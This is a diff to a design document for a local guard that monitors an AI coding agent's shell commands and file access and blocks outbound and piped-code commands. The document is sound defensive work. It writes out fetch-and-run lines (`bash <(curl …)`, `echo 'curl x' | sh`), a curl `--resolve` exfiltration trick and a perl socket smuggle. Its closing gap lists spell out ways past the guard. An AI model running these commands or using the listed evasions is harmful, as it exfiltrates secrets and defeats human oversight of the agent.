@@ -71,7 +71,9 @@ Hard constraints (non-negotiable):
 - **No secrets or file contents are stored.** Anything beyond what section 4
   lists needs the owner's explicit decision.
 - **Blocking decisions are fast and local.** They use memory only and never wait
-  for the network or a database.
+  for the network or a database. One exception, for a rule with `path_scope`
+  (section 5): a bounded walk of `lstat`/`readlink` calls on the local disk,
+  never the network (owner, 2026-10-23).
 - **Everything runs locally on your machine.** Anything that leaves it (the
   optional Neo4j copy, section 3) is off by default and your own choice.
 
@@ -293,10 +295,11 @@ instead of a third kind. Each is one named pure check in Python:
   program in the list (covers `| sh`, `sh -c "$(curl …)"`, `bash <(curl …)`).
 
 "After reading `.env`" means the whole `.env` family, as in the sensitive-file
-list below. The three additions are not built yet (card V5c); the rest of this
-section's file format is what V5b built.
+list below. V5c built the three additions; the ten rules, with R1 and
+`npm-publish-after-env`, are in `agentfly/rules/example.toml` in the package,
+which is never installed (copy the rules you want).
 
-**The file format (V5b).** `schema = 1`, one `[lists]` table of named arrays of
+**The file format (V5b, V5c).** `schema = 1`, one `[lists]` table of named arrays of
 strings, and `[[rule]]` tables, each with its own `[[rule.test]]` tables.
 
 | Field | Where | Meaning |
@@ -304,11 +307,34 @@ strings, and `[[rule]]` tables, each with its own `[[rule.test]]` tables.
 | `id`, `kind`, `severity`, `message` | every rule | `kind` is `match` or `after_then`; `severity` is `block`, `warn` or `highlight`; `id` is unique and never `R0` |
 | `event` | `match`, and inside `after` / `then` | a list of `read` (`beforeReadFile`, and a text search that returns lines: `preToolUse` of the Grep tool, below), `shell` (`beforeShellExecution`) and `write` (`preToolUse` of the Write tool) |
 | `path`, `path_except` | same | the name of a list of path patterns. A pattern without `/` matches the file *name* (`.env`, `*.pem`); with `/` the whole path (`**` crosses folders, `~/` is the home folder). In a shell command a path condition looks at every word, and at the text after the last `=` or `@` of a word |
-| `command` | same, `event = ["shell"]` | the name of a list of command patterns: a program, then extra words (`"git push --force"`). It matches when the program is a word of the normalised command (so `sudo`, `env`, `bash -c` and `$(…)` do not hide it) and every extra word is among the later words, in any order |
+| `command` | same, `event = ["shell"]` | the name of a list of command patterns: a program, then extra words (`"git push --force"`). It matches when the program is a word of the normalised command (so `sudo`, `env`, `bash -c` and `$(…)` do not hide it) and every extra word is among the later words, in any order. Flags, below |
 | `command_class` | same, `event = ["shell"]` | a class built into the program: `outbound` (R1's definition, below) |
-| `host_not_in` | same, `event = ["shell"]`, beside a `command` or `command_class` | the name of a list of host names; true when the command names a host not in it |
+| `host_not_in` | same, `event = ["shell"]`, beside a `command` or `command_class` | the name of a list of host names; true when the command names a host not in it. Beside `command` it judges only the simple commands the entry matched, and one that names no host, or holds a `$variable` or `$(…)`, counts as naming a host not in the list (`curl -d @f "$URL"`). Beside `command_class` alone it judges the whole line |
+| `path_scope` | `match`, and inside `after`, with every `event` `read` or `write` | `"outside_workspace"`: the file is under none of the folders Cursor sends as `workspace_roots`, links followed (below) |
+| `pipe_into` | `match`, beside `command` | the name of a list of program names; true when a command the `command` entry matched feeds one of them: through a pipe (also into a group or a loop, or across a newline after the `\|`), `$(…)` or backticks (also inside a herestring or a heredoc body), `<(…)` or `>(…)`. A line whose links cannot be known (a function, `coproc`, unmatched brackets, groups nested too deep, more than 20,000 links, text that does not parse) counts as feeding one, once the entry matched |
 | `after`, `then` | `after_then` | tables of the fields above; the follow-up fires only after the `after` table matched once in this chat |
-| `steps`, `expect` | `[[rule.test]]` | steps are `"read: PATH"`, `"shell: COMMAND"`, `"write: PATH"`; `expect` is what the last step gets: `block`, `warn`, `highlight` or `allow` |
+| `steps`, `expect`, `roots` | `[[rule.test]]` | steps are `"read: PATH"`, `"shell: COMMAND"`, `"write: PATH"`; `expect` is what the last step gets: `block`, `warn`, `highlight` or `allow`; `roots` (optional, at most 64 folder paths) is sent with every step as `workspace_roots` |
+
+**Flags in a `command` entry (V5c).** After the program, a word of `-` and ASCII letters only is
+one short flag per letter, and letters are case-sensitive (`-d` is not `-D`; `rm -rf` matches
+`rm -fr` and `rm -r -f`, not `rm -Rf`). A word `--name` is a long flag, case-folded; a trailing `*`
+makes it a prefix (`--data*` matches `--data`, `--data=x` and `--data-binary`). Every other word
+(`--x=v`, `-d@f`, `-5`) is matched as a whole word, as before. In the command, a word `-…` holds
+each character of its leading run of letters, digits and `#` (`-sd@f`, `-4d` and `-s4d` hold
+`-d`; `-o/tmp/d` holds `-o` only), and `--name=value` holds `--name`.
+
+**`path_scope` (V5c).** The path is the read's `file_path`, the write's `tool_input.file_path`, or
+a search's `tool_input.file_path` (a search with none counts as outside). `~`, `$HOME` and
+`${HOME}` are your home folder; a relative path is joined to the first root; `..` is folded. Each
+root and the path resolve through their longest existing folder by `lstat` and `readlink` (links
+followed, at most 32 hops), the missing rest joined as text. Every doubt counts as outside: no
+roots, more than 32, none usable (a usable root is an absolute path other than `/`), a path or root that does not
+resolve, or the hook's look-up budget spent (4,000 steps; the step record makes look-ups of its
+own on shell hooks only, where no scope runs, so a hook spends one such budget at most). A path outside every root as written and as resolved is outside with no disk call for
+it. Inside means every walk of the path (as sent and, with `..`, as folded) ends inside a resolved
+root, letter for letter: on a Mac, where `/tmp` links to `/private/tmp`, a path `/private/tmp/w/f`
+is inside a root `/tmp/w`. `rules check` refuses `path_scope` in a `then` table,
+in R1, and beside a `shell` event.
 
 When several rules fire, the strictest wins (block, then warn, then highlight); a
 tie goes to the rule that comes first in the file. R0 is always first and only in
@@ -362,10 +388,12 @@ reviewed change path (V7).
 command, inside the hook client's 0.5 s wait, so two limits keep a hook short. When the file is
 read, it may ask for at most 200 units of matching work in all: a clause with path patterns 2, a
 pattern without `/` 1, a pattern with `/` 4 plus 12 for each `**` (an unanchored pattern has one
-more) plus 1 for each folder or name past the fourth, R1's `after` twice because it runs twice. The
-packaged default uses 31. When a hook runs, the work that grows with the command, floating folder
-patterns (one that may start at any folder, such as `secrets/**`) and command-list entries, shares
-one budget for the hook: the *rules limit* (about 20 ms of matching). A rule the budget cannot
+more) plus 1 for each folder or name past the fourth, a clause with `path_scope` 2 (V5c), R1's
+`after` twice because it runs twice. The packaged default uses 31, `example.toml` 152. When a hook
+runs, the work that grows with the command, floating folder patterns (one that may start at any
+folder, such as `secrets/**`), command-list entries (a `--name*` entry once for each long flag of
+the command it may match) and the `pipe_into` walk (one step for each link it follows), shares one
+budget for the hook: the *rules limit* (about 20 ms of matching). A rule the budget cannot
 finish is unfinished: an unfinished `block` rule denies the action with the rules-limit message and
 records no trigger, an unfinished `warn` asks on a shell command, and an unfinished `highlight` is
 skipped; `/health` (`rules_limit`) and the recorder's log say so. R0 and R1 are never cut short: R1
@@ -526,9 +554,33 @@ computer is blocked. After normalisation that covers:
   `--enable`, `--disable`, `--dump`, `--backtrace-limit`, `--parser`,
   `--crash-report` and the `--…encoding` options; ruby's `-0`, `-T` and `-W`
   take only digits and `-K` one character, so `ruby -We` is code; perl's long
-  options, `--version` and `--help`, hold no code). A script file
-  (`perl x.pl`, `ruby x.rb`), `perl -c x.pl`, `perl -v` and `ruby --version` are
-  not one-liners;
+  options, `--version` and `--help`, hold no code). A perl `-M`, `-m`, `-d:` or
+  `-dt:` value that is not a plain module name (`Foo::Bar`, optionally `=a,b`) is
+  code itself: `perl '-MIO::Socket;print 1' x.pl` (V5c). A script file
+  (`perl x.pl`, `ruby x.rb`), `perl -c x.pl`, `perl -MFoo=a,b x.pl`, `perl -v` and
+  `ruby --version` are not one-liners;
+- code piped into an interpreter or a shell (V5c): `python`, `node`, `perl`,
+  `ruby`, `sh`, `bash`, `zsh`, `dash` or `ksh` (versioned names too) at the start
+  of a pipe stage, or after a wrapper there (`| sudo bash`, `| env A=1 python3`,
+  `| uv run python`, `| bundle exec ruby`), or inside `>(…)`, that names no
+  script, so it runs what comes in: `echo 'print(1)' | python3`,
+  `cat a.rb | ruby`, `echo 'curl x' | sh`, also with `-`, `/dev/stdin`,
+  `/dev/fd/N`, a shell's `-s`, or input from `< <(…)`, `< /dev/stdin` or `<&0`
+  (a redirect of another descriptor, `3</dev/null` or `2>&1`, leaves the pipe as
+  stdin). A shell's `-c` whose script holds `$(…)` or backticks, or itself reads
+  the pipe, counts too (`echo x | bash -c "$(cat)"`, `echo x | sh -c python3`).
+  A script word, `-m MODULE` or `< file` names a script: `git diff | python3
+  tool.py`, `cat x.json | python3 -m json.tool` and `python3 < x.py` are not
+  one-liners, nor is `echo hi | grep h` or `ps aux | grep python3` (`python3` is
+  a word there, not the program). After a wrapper (`sudo`, `env`, `xargs`,
+  `timeout`, `nice`, … and the runners `uv`, `npx`, `bundle`, …) whose program
+  is plainly the next word, only that word is a program, and so on down a chain
+  of wrappers (`env` and `sudo` assignments, `timeout`'s duration and a runner's
+  `run` or `exec` are skipped): `git ls-files | xargs grep -l node` and
+  `cat x | sudo grep python` are not one-liners. With an option in between, or
+  after `parallel`, every later word counts as a program: `| xargs -0 grep -l sh`
+  and `| sudo -u bob python3` are (owner 2026-10-23). Rule 14's `pipe_into`
+  keeps every word after a wrapper;
 - a command that cannot be parsed (an unbalanced quote, or a `<<EOF` block);
 - the same tools inside a wrapper.
 
@@ -930,7 +982,12 @@ token is never treated as an allow.
 - it **denies** outbound commands: `curl`, `wget`, `nc`, `scp`, `ssh`,
   `rsync`, `git push`, `gh`, `aws`, every inline `python -c` / `node -e` /
   `perl -e` / `ruby -e` one-liner (whatever it contains; the forms section 5
-  lists), and the same commands wrapped in `bash -c`, `env` or `sudo`. Sending to your own computer (`localhost`, private
+  lists), code piped into an interpreter or a shell (`echo 'print(1)' | python3`,
+  `echo 'curl x' | sh`, `python3 < <(cat x)`, `| xargs -0 grep -l sh`, but not
+  `| xargs grep -l node`; section 5, V5c),
+  and the same commands wrapped in `bash -c`, `env` or `sudo`. A line of more
+  than 1,000 pipe stages, or more than 20,000 quoted words when it names `perl`,
+  is denied unread. Sending to your own computer (`localhost`, private
   addresses) is allowed;
 - it **denies** commands that touch AgentFly's guard paths (R0), and any Read, Write
   or Edit (every file tool, `StrReplace` and `Delete` included) whose target is a
@@ -1103,6 +1160,50 @@ Other measures:
   can read it; the check does not look inside.
 - "Write a script file, then run it" is not caught: only inline one-liners and
   heredocs fed to the shells and interpreters listed in section 5 count.
+- A rule with `path_scope` makes disk calls inside the decision (section 2's
+  exception). The recorder already makes some before it answers (the step record,
+  the session notes); this widens that. A step budget bounds how many, not how
+  long one takes: an `lstat` that hangs (a dead network mount) runs past the
+  client's 0.5 s wait, and its offline guard then allows the write (owner told
+  2026-10-23).
+- What the V5c rule fields (section 5) do not see, all in `example.toml`'s rules,
+  none of them on by default:
+  - a program named by a variable or a substitution (`$SH`, `$(which sh)`), and a
+    function or alias from an earlier command called by name;
+  - what goes through a file descriptor or a named pipe (`exec 3< <(curl x); sh
+    <&3`, `mkfifo p`), or through a variable (`x=$(curl u); echo "$x" | sh`), and
+    `. <(curl …)` (`.` is not in rule 14's list; `source` is);
+  - curl's own abbreviations of long options (`--data-b`), which older curl
+    releases accept (wget's are entries of their own);
+  - curl's `--resolve` and `--connect-to` with an address
+    (`curl -d @f --resolve localhost:80:203.0.113.5 http://localhost` sends to
+    that address): rule 5 and R1 read the URL's host only;
+  - a private key with a name of its own, read by a relative path (`cat mykey`
+    in `~/.ssh`): rule 1 knows the default key names only;
+  - a file four or more folders under `.github/workflows/`: rule 7 lists three
+    depths, since a `**` there would be tried at every folder of the path.
+- False alarms the same fields raise, toward firing: `curl -XGET x.example`
+  fires rule 5 (a cluster's letters are flags, so `-XGET` holds `-T`);
+  `curl -d "$BODY" http://localhost:3000` fires rule 5 (a `$` in the matched
+  command counts as an unknown host; reading where a host may stand would need each option's
+  arguments, and `curl -d @f -s "$URL" localhost` sends to `$URL`); `rsync -a
+  out.txt localhost:/tmp` fires rule 4 after a secret read (`out.txt` looks like a
+  host name, `looks_like_host_token`); a path that differs from a workspace
+  folder in letter case (`/Work/app/f` under `/work/app`) is outside for rule 8,
+  though the Mac's disk ignores case.
+- Piped code (section 5), after a mark and in the offline guard: after a wrapper
+  with an option, or after `parallel`, every word counts as a program, so
+  `cat x | xargs -0 grep sh` is denied (owner 2026-10-23); so is
+  `ls | bash -c "wc -l $(pwd)"`, a fed shell whose `-c` script holds a
+  substitution. The offline guard reads each pipe stage with a regular
+  expression, which costs about 150 ms more per MiB of text made of pipes; past
+  its caps (section 9) it denies. It reads a quoted `|` as a pipe on purpose (to
+  see into `bash -c '…'`), so `ps aux | grep -E 'node|python'` is denied offline,
+  though the recorder allows it (owner 2026-10-23: accepted).
+- What piped code does not see, after a mark and offline: `source /dev/stdin`
+  and `eval "$(cat)"` fed by a pipe (`source` and `eval` are not in section 5's
+  list; rule 14 lists them as shells), and, offline only, a compound command
+  after the `|` (`| if true; then python3; fi`), which the recorder sees.
 
 ---
 
